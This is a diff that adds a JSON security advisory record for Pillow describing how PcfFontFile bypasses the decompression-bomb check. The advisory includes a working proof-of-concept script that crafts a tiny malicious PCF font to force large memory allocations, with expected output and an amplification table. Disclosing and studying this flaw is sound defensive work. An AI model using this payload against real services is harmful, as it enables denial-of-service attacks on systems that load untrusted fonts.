@@ -1,0 +1,171 @@
+{
+  "id": "GHSA-8v84-f9pq-wr9x",
+  "modified": "2026-07-20T21:15:26.038427201Z",
+  "published": "2026-07-20T21:08:27Z",
+  "aliases": [
+    "BIT-pillow-2026-54059",
+    "CVE-2026-54059",
+    "PYSEC-2026-2253"
+  ],
+  "summary": "Pillow `PcfFontFile._load_bitmaps()`: `Image.frombytes()` called without `_decompression_bomb_check()` — bomb protection bypass via PCF font loading",
+  "details": "## Description\n`PIL/PcfFontFile.py` `_load_bitmaps()` (line 227) reads glyph dimensions from the PCF `METRICS` section and passes them directly to `Image.frombytes()` without calling `Image._decompression_bomb_check()`. Dimensions originate from unsigned 16-bit values:\n\n```\nxsize = right - left          (max: 65535 − 0 = 65535)\nysize = ascent + descent      (max: 65535 + 65535 = 131070)\n```\n\nMaximum exploitable pixel count: **65,535 × 131,070 = 8,589,734,450 pixels** — **48× the DecompressionBombError threshold**.\n\n**Vulnerable code (`PIL/PcfFontFile.py` line 224–227):**\n```python\nfor i in range(nbitmaps):\n    xsize, ysize = metrics[i][:2]    # from PCF METRICS — attacker-controlled\n    b, e = offsets[i : i + 2]\n    bitmaps.append(\n        Image.frombytes(\"1\", (xsize, ysize), data[b:e], \"raw\", mode, pad(xsize))\n        # ↑ NO _decompression_bomb_check()!\n    )\n```\n\n`Image.frombytes()` calls `Image.new()` first (allocating the full C-heap buffer), **then** attempts to fill it. This creates two distinct attack paths:\n\n- **Persistent attack**: Provide matching bitmap data → `frombytes()` succeeds → image stored in `font.glyph[ch]` permanently\n- **Transient attack**: Provide a 148-byte PCF file with large declared dimensions but no data → `Image.new()` allocates the full buffer → `ValueError` → buffer freed → but the spike occurs before Python can respond\n\n## Steps to reproduce\n\n**Proof of Concept script:**\n\n```python\n#!/usr/bin/env python3\n\"\"\"PoC: PcfFontFile bomb bypass — 148-byte PCF → 23 MB allocation\"\"\"\nimport io, struct, tracemalloc, warnings\nwarnings.filterwarnings(\"ignore\")\n\nfrom PIL.PcfFontFile import PcfFontFile\nfrom PIL.Image import _decompression_bomb_check, DecompressionBombWarning, DecompressionBombError\n\nW, H = 14000, 14000   # 196M pixels → above DecompressionBombError threshold\n\n# Show what Image.open() would do\nwarnings.filterwarnings(\"error\", category=DecompressionBombWarning)\ntry:\n    _decompression_bomb_check((W, H))\nexcept (DecompressionBombWarning, DecompressionBombError) as e:\n    print(f\"[Image.open() path] BLOCKED by {type(e).__name__}\")\nwarnings.filterwarnings(\"ignore\")\n\n# PCF binary constants\nPCF_MAGIC    = 0x70636601\nPCF_PROPS    = 1 \u003c\u003c 0\nPCF_METRICS  = 1 \u003c\u003c 2\nPCF_BITMAPS  = 1 \u003c\u003c 3\nPCF_ENCODINGS= 1 \u003c\u003c 5\n\ndef build_bomb_pcf(xsize, ysize):\n    # Properties: empty\n    props = struct.pack(\"\u003cIII\", 0, 0, 0)\n\n    # Metrics (jumbo, non-compressed): 1 glyph — xsize=right-left, ysize=ascent+descent\n    metrics = struct.pack(\"\u003cII\", 0, 1)\n    metrics += struct.pack(\"\u003cHHHHHH\", 0, xsize, xsize, ysize, 0, 0)\n\n    # Bitmaps: 1 glyph, empty data (transient attack)\n    bitmaps = struct.pack(\"\u003cII\", 0, 1)\n    bitmaps += struct.pack(\"\u003cI\", 0)              # offset[0] = 0\n    bitmaps += struct.pack(\"\u003cIIII\", 0, 0, 0, 0) # bitmap_sizes all = 0\n\n    # Encodings: char 0x41 ('A') → glyph 0\n    enc_offsets = [0xFFFF]*65 + [0] + [0xFFFF]*62\n    encodings = struct.pack(\"\u003cIHHHHH\", 0, 0, 127, 0, 0, 0xFFFF)\n    encodings += struct.pack(\"\u003c\" + \"H\"*128, *enc_offsets)\n\n    secs = [(PCF_PROPS, props), (PCF_METRICS, metrics),\n            (PCF_BITMAPS, bitmaps), (PCF_ENCODINGS, encodings)]\n    hdr_size = 4 + 4 + len(secs) * 16\n    out = struct.pack(\"\u003cII\", PCF_MAGIC, len(secs))\n    offset = hdr_size\n    for stype, sdata in secs:\n        out += struct.pack(\"\u003cIIII\", stype, 0, len(sdata), offset)\n        offset += len(sdata)\n    for _, sdata in secs:\n        out += sdata\n    return out\n\npcf = build_bomb_pcf(W, H)\nprint(f\"[*] PCF file size  : {len(pcf)} bytes\")\nprint(f\"[*] Glyph size     : {W} x {H} = {W*H:,} pixels\")\nprint(f\"[*] C-heap target  : {W*H//8//1024**2} MB  (mode '1' = 1 bit/pixel)\")\n\ntracemalloc.start()\ntry:\n    font = PcfFontFile(io.BytesIO(pcf))\n    _, peak = tracemalloc.get_traced_memory()\n    tracemalloc.stop()\n    print(f\"[!] CONFIRMED (persistent): bomb check bypassed — heap peak {peak/1024**2:.2f} MB\")\nexcept Exception as e:\n    _, peak = tracemalloc.get_traced_memory()\n    tracemalloc.stop()\n    print(f\"[!] CONFIRMED (transient): {type(e).__name__} after allocation\")\n    print(f\"    Heap peak: {peak/1024**2:.2f} MB\")\n    print(f\"    C-heap allocation of ~{W*H//8//1024**2} MB occurred before exception\")\n```\n\n**Expected output:**\n```\n[Image.open() path] BLOCKED by DecompressionBombError\n[*] PCF file size  : 148 bytes\n[*] Glyph size     : 14000 x 14000 = 196,000,000 pixels\n[*] C-heap target  : 23 MB  (mode '1' = 1 bit/pixel)\n[!] CONFIRMED (transient): ValueError after allocation\n    C-heap allocation of ~23 MB occurred before exception\n```\n\n**Amplification table:**\n\n| PCF file | Glyph dims | C-heap (mode '1') | Bomb check |\n|---|---|---|---|\n| 148 bytes | 14000 × 14000 | 23 MB (transient) | Bypassed |\n| 148 bytes | 65535 × 131070 | 1.07 GB (transient) | Bypassed |\n| ~512 MB | 65535 × 131070 | 1.07 GB (persistent) | Bypassed |\n\n## Impact\n- **Availability**: HIGH — up to 1.07 GB per glyph, no limit per font file\n- **Confidentiality**: None\n- **Integrity**: None\n- Any service loading PCF fonts from untrusted sources (e.g., `PcfFontFile(fp)`) is affected\n- `PcfFontFile` is never loaded via `Image.open()`, so the bomb check protection is completely absent from the entire PCF font loading path\n- Confirmed unpatched on `python-pillow/Pillow` `main` branch as of 2026-06-07",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pillow",
+        "purl": "pkg:pypi/pillow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "12.3.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.0",
+        "1.1",
+        "1.2",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.7.0",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.7.4",
+        "1.7.5",
+        "1.7.6",
+        "1.7.7",
+        "1.7.8",
+        "10.0.0",
+        "10.0.1",
+        "10.1.0",
+        "10.2.0",
+        "10.3.0",
+        "10.4.0",
+        "11.0.0",
+        "11.1.0",
+        "11.2.1",
+        "11.3.0",
+        "12.0.0",
+        "12.1.0",
+        "12.1.1",
+        "12.2.0",
+        "2.0.0",
+        "2.1.0",
+        "2.2.0",
+        "2.2.1",
+        "2.2.2",
+        "2.3.0",
+        "2.3.1",
+        "2.3.2",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.5.3",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.7.0",
+        "2.8.0",
+        "2.8.1",
+        "2.8.2",
+        "2.9.0",
+        "3.0.0",
+        "3.1.0",
+        "3.1.0.rc1",
+        "3.1.0rc1",
+        "3.1.1",
+        "3.1.2",
+        "3.2.0",
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.4.0",
+        "3.4.1",
+        "3.4.2",
+        "4.0.0",
+        "4.1.0",
+        "4.1.1",
+        "4.2.0",
+        "4.2.1",
+        "4.3.0",
+        "5.0.0",
+        "5.1.0",
+        "5.2.0",
+        "5.3.0",
+        "5.4.0",
+        "5.4.0.dev0",
+        "5.4.1",
+        "6.0.0",
+        "6.1.0",
+        "6.2.0",
+        "6.2.1",
+        "6.2.2",
+        "7.0.0",
+        "7.1.0",
+        "7.1.1",
+        "7.1.2",
+        "7.2.0",
+        "8.0.0",
+        "8.0.1",
+        "8.1.0",
+        "8.1.1",
+        "8.1.2",
+        "8.2.0",
+        "8.3.0",
+        "8.3.1",
+        "8.3.2",
+        "8.4.0",
+        "9.0.0",
+        "9.0.1",
+        "9.1.0",
+        "9.1.1",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-8v84-f9pq-wr9x/GHSA-8v84-f9pq-wr9x.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-8v84-f9pq-wr9x"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54059"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2253.yaml"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/python-pillow/Pillow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst"
+    }
+  ]
+}
